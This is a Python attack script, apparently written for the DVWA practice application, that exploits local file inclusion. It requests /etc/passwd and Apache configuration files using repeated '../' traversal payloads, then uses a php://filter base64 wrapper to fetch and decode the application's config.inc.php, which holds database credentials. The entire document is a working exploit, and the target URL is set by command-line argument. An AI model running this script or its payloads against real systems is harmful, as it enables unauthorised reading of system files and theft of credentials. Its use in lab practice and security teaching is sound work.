import requests
import argparse
import base64
from fabric.colors import red, yellow, green

parser = argparse.ArgumentParser()
parser.add_argument('--url', required='True',
                    help='Enter the vulnerable url')

args = parser.parse_args()
url = args.url

# url = "http://localhost/vulnerabilities/fi/?page="

payload = "../"
filename = ["etc/passwd", "/etc/apache2/apache2.conf"]
string = ["root:", "apache"]
cookies = {'PHPSESSID': '25ibgus5om4kma6hp2si8j9p6b', 'security': 'low'}


def decodeBase64(s):
    try:
        return base64.b64decode(s)
    except Exception:
        return False


# Combining File Inclusion with Directory Traversal
for file in filename:
    url_ = url + file
    print("\n", yellow(url_))
    req = requests.get(url_, cookies=cookies)

    if any(keyword in req.text for keyword in string):
        print(red("[!] The URL path is vulnerable to local file inclusion attack"))
        print(red("[-]Data retrieved.."))
        print(req.text)

    else:
        print("\n", yellow("[+] Combining File Inclusion with Directory Traversal..."))
        for i in range(1, 9):
            data = payload * i + file
            req = requests.get(url + data, cookies=cookies)
            print(yellow(url + data))
            if req.status_code == 200 and any(keyword in req.text for keyword in string):
                print(red("[!]The URL path is vulnerable to local file inclusion attack"))
                print(red("[-]Data retrieved.."))
                print(req.text)
                break
            else:
                continue

# trying php wrappers
print("\n", yellow("[+] Getting the Source Code"))
print(yellow("------------------------------"))
php_wrapper_payload = "php://filter/convert.base64-encode/resource=../../config/config.inc.php"
req = requests.get(url + php_wrapper_payload, cookies=cookies)
if req.status_code == 200:
    print(red("[-]Base 64 Data retrieved.."))
    print(req.text)
    try:
        print(yellow("Decoding base64 data..."))
        data = decodeBase64(req.text)
        print(data.decode('UTF-8'))
    except Exception:
        print(yellow("[+] Could not fetch source code..."))
        print(green("[!]The URL path is not vulnerable to local file inclusion attack"))
        pass
